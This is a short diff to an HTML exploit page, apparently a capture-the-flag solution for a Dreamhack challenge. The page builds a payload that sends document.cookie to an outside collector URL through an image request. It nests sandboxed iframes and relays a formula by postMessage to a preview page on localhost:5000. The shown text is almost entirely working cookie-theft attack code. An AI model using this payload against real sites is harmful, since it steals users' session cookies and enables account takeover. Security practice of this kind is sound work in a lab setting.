@@ -1,3 +1,6 @@
+<!doctype html>
+<html>
+<body>
 <script>
 const callback = "https://qmpdaak.request.dreamhack.games/collect";
 const widgetJs = "new Image().src='" + callback + "?c='+encodeURIComponent(document.cookie)";
@@ -21,9 +24,11 @@ onmessage = function(e) {
 
 const innerScript = "setTimeout(function(){p.contentWindow.postMessage(" + JSON.stringify(formula) + ",'*')},2000);onmessage=function(e){top.postMessage(e.data,'*')};";
 
-document.body.innerHTML = 
+document.body.innerHTML =
   "<iframe sandbox='allow-scripts' srcdoc=\"" +
   "<iframe id=p src='http://localhost:5000/preview'></iframe>" +
   "<script>" + innerScript + "<\\/script>" +
   "\"></iframe>";
 </script>
+</body>
+</html>
